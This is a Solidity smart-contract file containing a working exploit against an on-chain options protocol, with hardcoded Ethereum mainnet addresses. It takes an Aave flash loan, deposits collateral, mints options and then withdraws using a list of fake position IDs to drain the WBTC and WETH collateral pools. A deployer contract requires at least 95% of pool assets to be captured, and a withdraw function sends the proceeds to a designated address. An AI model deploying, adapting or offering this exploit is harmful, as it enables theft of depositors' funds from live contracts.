// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract WBTC_WETH30bpsMainnetAttacker_Deployer {
    WBTC_WETH30bpsMainnetAttacker public attacker;
    IERC20Partial token0 = IERC20Partial(address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599)); // wbtc
    IERC20Partial token1 = IERC20Partial(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)); // weth
    ICollateralTracker tracker0 = ICollateralTracker(address(0xb310cf625f519DA965c587e22Ff6Ecb49809eD09));
    ICollateralTracker tracker1 = ICollateralTracker(address(0x1F8D600A0211DD76A8c1Ac6065BC0816aFd118ef));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new WBTC_WETH30bpsMainnetAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = token0.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract WBTC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
    uint256[] fake_token_uints = [16932343400165264, 16988277108887827, 16993655162578412, 16939609024273842, 16995993874926379, 17133860513315788, 17107685890532457, 17083582814389265, 16940269736292543, 17101708812844843, 16927858255610090, 17086352299123725, 16916111252789762, 16980362901391387, 17003795739444277, 17101378560687335, 17006045362593199, 17030439208130036, 17063366226512834, 16905884702516433, 17119504401467382, 17034803466092545, 16985606900097701, 16942964596981210, 17025612530710537, 16889820611195521, 16954544221541041, 16949521359855531, 16914178675719633, 16890694515986045, 17119951603807036, 17119329401324348, 16935941131740839, 16999873957325411, 17031339119151811, 17049620233322987, 16997018527186481, 16900417526689188, 17130624793684447, 17073996118339521, 17073485236538696, 16941005867879549, 17067919565309087, 17103589480369901, 16897464278369093, 17144420237880467, 17101150678162124, 16927713925256617, 17027825720482802, 17062001812029684, 17038739514264792, 16896222394180792, 17100042690718021, 17005578710070990, 17052541747857150, 17001603935953842, 17038292193577029, 17130759040409663, 17166195869489409, 17101208203141327, 16908147932247101, 17017661774688634, 16908153974732775, 16913597968133068, 17014445553286162, 16974767401004252, 16967923632426531, 16895531852075711, 17099849001593597, 17153702279128601, 16929239666017003, 17020691157262149, 16897926812058864, 17044600072961146, 17064714233413875, 17045419378318324, 16946829128487768, 17050277920000050, 17146520609095429, 17032253897074887, 16907480429887088, 16962955384487272, 16929389484689115, 16934457177659003, 16894109815048865, 17142593927072576, 17088317117953075, 17128654064464828, 17029938928325889, 17094514593261230, 16888769806416760, 17029198303267245, 17004523319620584, 16947327288449607, 17029065097821193, 16996711919775464, 17057227897167136, 16990649632113938, 17060232259853742, 16968539133849167, 16944179477276374, 16919590554483084, 16900114985532166, 16993502753544935, 16953408099015714, 17161081997515482, 17154610629572122, 17022685737634914, 16991628369728980, 17064829018677470, 17057008683916553, 17087643854683771, 16932248563778116, 16991286763756420, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On mainnet
    IERC20Partial token0 = IERC20Partial(address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599)); // wbtc
    IERC20Partial token1 = IERC20Partial(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)); // weth
    IAAVELendingPool aavePool = IAAVELendingPool(address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2));

    ICollateralTracker tracker0 = ICollateralTracker(address(0xb310cf625f519DA965c587e22Ff6Ecb49809eD09));
    ICollateralTracker tracker1 = ICollateralTracker(address(0x1F8D600A0211DD76A8c1Ac6065BC0816aFd118ef));
    IPanopticPool pp = IPanopticPool(address(0x000000000000100921465982d28b37D2006e87Fc));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
      withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            address[] memory addresses = new address[](2);
            uint256[] memory amounts = new uint256[](2);
            uint256[] memory modes = new uint256[](2);

            addresses[0] = address(token0);
            amounts[0] = (2 * poolAssets0); // borrow 200% of the pool assets
            modes[0] = 0;

            addresses[1] = address(token1);
            amounts[1] = (2 * poolAssets1); // borrow 200% of the pool assets
            modes[1] = 0;

            aavePool.flashLoan(address(this), addresses, amounts, modes, address(this), bytes(""), 0);
        }
    }

    // This function is called by the flash loan provider
    // We use it to execute our attack logic after taking a flash loan
    function executeOperation(
        address[] calldata, // assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, // initiator,
        bytes calldata // params
    ) public returns (bool) {
        // executeOperation has to be public for the Aave flash loan to callback into us
        // However, we should only let this get called once ever:
        require(!executed);
        // Phase 1: Drain the pool
        drainPool();

        // Phase 2: buy options and then drain pool (not implemented in this example)

        // pay back the flash loan
        token0.approve(address(aavePool), amounts[0] + premiums[0]);
        token1.approve(address(aavePool), amounts[1] + premiums[1]);
        executed = true;

        return true;
    }


    function drainPool() internal {
        // drain the pool

        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        token0.approve(address(tracker0), type(uint104).max);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit(uint128(token0.balanceOf(address(this))), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283224821463586597824);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283224821463586597824);
        posIdList2[1] = TokenId.wrap(2570843629053219211274302417856);

        /* No longer necessary, we precomputed the TokenIds, they are above
        {
          // --- for Asset 0
          TokenId pos0 = TokenId.wrap(0).addPoolId(ISFPM(address(0x0000000000000DEdEDdD16227aA3D836C5753194)).getPoolId(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD)).addLeg(
              0, // legIndex
              1, // optionRatio
              0, // asset
              0, // isLong
              0, // tokenType
              0, // riskPartner
              -327_000, // strikeTick strike - should be WAAAAY low -- (rounded) minEnforcedTick + spacing, so that tickLower is within bounds
              2 // width; defined as (tickUpper - tickLower) / tickSpacing
          );
          posIdList[0] = pos0;

          // --- for Asset 1
          TokenId pos1 = TokenId.wrap(0).addPoolId(ISFPM(address(0x0000000000000DEdEDdD16227aA3D836C5753194)).getPoolId(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD)).addLeg(
              0, // legIndex
              1, // optionRatio
              1, // asset
              0, // isLong
              1, // tokenType
              0, // riskPartner
              470400, // waaaay high -- (rounded) maxEnforcedTick - spacing, so that tickUpper is within bounds
              2 // width; defined as (tickUpper - tickLower) / tickSpacing
          );

          posIdList2[0] = pos0;
          posIdList2[1] = pos1;
        }
        */

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }
}
